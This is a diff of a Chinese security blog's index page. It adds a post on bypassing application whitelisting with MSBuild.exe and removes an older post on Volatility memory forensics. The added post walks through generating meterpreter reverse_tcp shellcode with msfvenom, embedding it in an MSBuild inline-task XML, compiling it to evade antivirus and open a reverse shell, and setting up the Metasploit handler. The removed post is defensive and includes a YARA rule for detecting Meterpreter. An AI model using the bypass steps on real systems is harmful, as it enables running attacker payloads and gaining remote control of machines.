@@ -252,6 +252,157 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/26/MSBuild.exe-bypass-application-whitelisting/" itemprop="url">MSBuild.exe-bypass application whitelisting</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-1.png" alt=""></p>
+<h3 id="2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中"><a href="#2）下载executes-20shellcode-xml，将上面生成的shellcode复制到该XML文件中" class="headerlink" title="2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中"></a>2）下载executes%20shellcode.xml，将上面生成的shellcode复制到该XML文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20shellcode.xml</span><br></pre></td></tr></table></figure>
+<p>注意:从C＃shellcode中替换shellcode值，然后将msfvenom 生成的shellcode中的buf重命名为shellcode<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-2.jpg" alt=""></p>
+<h3 id="3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell"><a href="#3）MSBuild-exe编译上面xml文件，执行shellcode-反弹shell" class="headerlink" title="3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell"></a>3）MSBuild.exe编译上面xml文件，执行shellcode 反弹shell</h3><p>或者将上面xml文件后缀修改为.csproj (C#项目文件的扩展名) ，然后MSBuild.exe编译，同样可以执行shellcode 反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe D:\test\mstest.xml</span><br><span class="line">或者</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  D:\test\mstest.csproj</span><br></pre></td></tr></table></figure>
+<p><img src="/images/MSBuild.exe-bypass-application-whitelisting-3.png" alt=""><br>或者<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-4.png" alt=""></p>
+<p>成功bypass av，反弹shell：<br><img src="/images/MSBuild.exe-bypass-application-whitelisting-5.png" alt=""></p>
+<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/" target="_blank" rel="noopener">https://www.hackingarticles.in/bypass-application-whitelisting-using-msbuild-exe-multiple-methods/</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/12/PHP弱类型/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1851,196 +2002,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/28/利用Volatility进行入侵痕迹分析/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/07/28/利用Volatility进行入侵痕迹分析/" itemprop="url">利用Volatility进行入侵痕迹分析</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-07-28T09:38:36+08:00">
-                2018-07-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/应急响应/" itemprop="url" rel="index">
-                    <span itemprop="name">应急响应</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>2018-07-28 首发于阿里先知: <a href="https://xz.aliyun.com/t/2497" target="_blank" rel="noopener">https://xz.aliyun.com/t/2497</a></p>
-<p><strong>0x00前言</strong></p>
-<p>本文利用Volatility进行内存取证，分析入侵攻击痕迹，包括网络连接、进程、服务、驱动模块、DLL、handles、检测进程注入、检测Meterpreter、cmd历史命令、IE浏览器历史记录、启动项、用户、shimcache、userassist、部分rootkit隐藏文件、cmdliner等。</p>
-<p>环境准备：<br>Kali2中自带Volatility（版本2.4），可下载最新版本2.6，下载即可使用。<br>下载地址：<a href="https://github.com/volatilityfoundation/volatility" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility</a><br>windows系统可使用DumpIt等制作镜像。</p>
-<p>本为以window系统镜像为例，简单模拟了一次入侵行为，然后利用Volatility进行分析：</p>
-<p><strong>0x01查看网络连接</strong><br>netscan 查看网络连接情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 netscan</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132633-ca6189c0-9226-1.png" alt=""></p>
-<p><strong>0x02查看进程</strong></p>
-<p>pslist、psxview可查看进程，其中psxview可查看一些隐藏进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 pslist</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 psxview</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132633-ca8034ec-9226-1.png" alt=""></p>
-<p><strong>0x03查找进程注入</strong><br>malfind 查找隐藏或注入的代码/ DLL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 malfind</span><br></pre></td></tr></table></figure></p>
-<p>可看到进程pid为620的svchost.exe存在异常：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132633-ca948d52-9226-1.png" alt=""></p>
-<p><strong>0x04提取文件</strong></p>
-<p>memdump 提取进程在内存中的信息保存到文件中 –D 指定保存的目录<br>procdump 提取进程的可执行文件<br>提取出文件后，可以到<a href="http://www.virustotal.com进行检验" target="_blank" rel="noopener">www.virustotal.com进行检验</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 procdump -p 620 -D dump</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 memdump -p 620 -D dump   #时间较长，文件较大</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-caa34cfc-9226-1.png" alt=""><br> 成功检测出提取的文件有Meterpreter攻击痕迹：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cab86f92-9226-1.png" alt=""></p>
-<p><strong>0x05yarascan 检测Meterpreter</strong><br>上面通过memdump 提取pid为620的进程，可检测出Meterpreter攻击痕迹，还可以通过YARA进行检测。yarascan 可利用YARA规则进行检测 -Y 指定自定义的规则，-y 指定包含YARA规则。通过文章（<a href="http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/）" target="_blank" rel="noopener">http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/）</a> 的规则学习，可进行检测Meterpreter攻击痕迹。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 yarascan -y fm.yara</span><br></pre></td></tr></table></figure>
-<p>fm.yara文件如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rule Find_Meterpreter</span><br><span class="line">&#123;</span><br><span class="line">	meta:</span><br><span class="line">		desrciption = &quot;it&apos;s the Meterpreter!&quot;</span><br><span class="line">	strings:</span><br><span class="line">		$a = &#123; 6D 65 74 73 72 76 2E 64 6C 6C 00 00 52 65 66 6C 65 63 74 69 76 65 4C 6F 61 64 65 72 &#125;</span><br><span class="line">		$b = &quot;stdapi_&quot; ascii nocase</span><br><span class="line"></span><br><span class="line">	condition:</span><br><span class="line">		$a and $b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cac83f44-9226-1.png" alt=""><br>成功检测到Meterpreter攻击痕迹：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cae0098a-9226-1.png" alt=""></p>
-<p><strong>0x06查看&amp;提取DLL</strong></p>
-<p>dlllist 查看dll文件<br>ldrmodules 可查看一些隐藏的dll<br>dlldump 提取dll文件<br>提取出dll文件后，可以到<a href="http://www.virustotal.com进行检验" target="_blank" rel="noopener">www.virustotal.com进行检验</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 dlllist -p 1656</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 dlldump -p 1656 -D dump</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 ldrmodules</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-caf900de-9226-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cb0c2204-9226-1.png" alt=""><br>成功检测出提取出来的可疑dll文件：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132634-cb1e015e-9226-1.png" alt=""></p>
-<p><strong>0x07查看文件句柄</strong><br>handles 查看进程打开的handles<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 handles -p 620 -t file</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb367b76-9226-1.png" alt=""></p>
-<p><strong>0x08查看cmd历史命令</strong></p>
-<p>cmdscan   查看内存中保留的 cmd 命令使用情况，还可以看到powershell命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 cmdscan</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb4abf1e-9226-1.png" alt=""></p>
-<p><strong>0x09查看IE浏览器历史记录</strong></p>
-<p>1）iehistory插件<br>iehistory  可查看IE浏览中的历史记录，但是有时会出bug，查看不到信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 iehistory</span><br></pre></td></tr></table></figure></p>
-<p>2）yarascan搜索记录<br>可以先找到iexplore进程，然后通过yarascan来定义YARA规则进行搜索IE浏览器历史记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 pslist | grep iexplore</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 yarascan -Y &quot;/(URL|REDR|LEAK)/&quot; -p 1904,220,3276,3676</span><br></pre></td></tr></table></figure></p>
-<p>查看iexplore进程pid：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb5ff0e6-9226-1.png" alt=""><br>成功检测到ie历史记录：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb716ae2-9226-1.png" alt=""></p>
-<p>3）memdump &amp; strings提取记录<br>还可以通过memdump提取iexplore进程中的信息到文件中，然后通过strings来搜索IE浏览器历史记录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180410-073551.raw --profile=Win7SP1x86 memdump -p 1904,220,3276,3676 -D dump</span><br><span class="line">strings dump/1904.dmp | grep -i http:// | sort | uniq -u</span><br></pre></td></tr></table></figure></p>
-<p>根据pid提取iexplore进程文件：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb826edc-9226-1.png" alt=""><br>strings成功提取到ie历史记录：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cb97fdd8-9226-1.png" alt=""></p>
-<p><strong>0x10查看注册表</strong><br>printkey可查看指定注册表项信息<br>1）查看启动项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 printkey -K &quot;Microsoft\Windows\CurrentVersion\Run&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cbaf60f4-9226-1.png" alt=""></p>
-<p>2）查看用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132635-cbc1e238-9226-1.png" alt=""></p>
-<p>3）shimcache信息查看</p>
-<p>ShimCache来识别应用程序兼容性问题。跟踪文件路径，大小，最后修改时间和最后“执行”时间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 shimcache</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132636-cbd7f460-9226-1.png" alt=""></p>
-<p>4）userassist信息查看<br>userassist键值包含系统或桌面执行文件的信息，如名称、路径、执行次数、最后一次执行时间等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180407-042003.raw --profile=Win7SP1x86 userassist</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132636-cbeb204e-9226-1.png" alt=""></p>
-<p><strong>0x11查看服务svcscan</strong><br>svcscan查看服务<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 svcscan</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180728132636-cbfc9cf2-9226-1.png" alt=""></p>
-<p><strong>0x12查看内核驱动模块</strong><br>modules  查看内核驱动<br>modscan、driverscan  可查看一些隐藏的内核驱动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 modules</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 modscan</span><br><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 driverscan</span><br></pre></td></tr></table></figure></p>
-<p><strong>0x13查看文件</strong><br>filescan  可查看 一些rootkit隐藏文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180409-232828.raw --profile=Win7SP1x86 filescan  #可查看 一些rootkit隐藏文件</span><br></pre></td></tr></table></figure></p>
-<p><strong>0x14查看时间线cmdliner</strong><br>timeliner 查看各组件时间线。 输出会很多，建议输出到指定文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python vol.py -f /root/lltest/PC-20170527XAOD-20180407-042003.raw --profile=Win7SP1x86 timeliner --output=text --output-file=out1.txt</span><br></pre></td></tr></table></figure></p>
-<p>当然，volatility还有许多命令和插件，本文只是抛砖引玉，简单写了一些常用方式。</p>
-<p><strong>参考</strong><br><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a><br><a href="http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/" target="_blank" rel="noopener">http://cyberforensicator.com/2018/03/11/finding-metasploits-meterpreter-traces-with-memory-forensics/</a><br><a href="https://eforensicsmag.com/finding-advanced-malware-using-volatility/" target="_blank" rel="noopener">https://eforensicsmag.com/finding-advanced-malware-using-volatility/</a><br><a href="https://volatility-labs.blogspot.com/2012/09/howto-scan-for-internet-cachehistory.html" target="_blank" rel="noopener">https://volatility-labs.blogspot.com/2012/09/howto-scan-for-internet-cachehistory.html</a></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2093,7 +2054,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-count">12</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
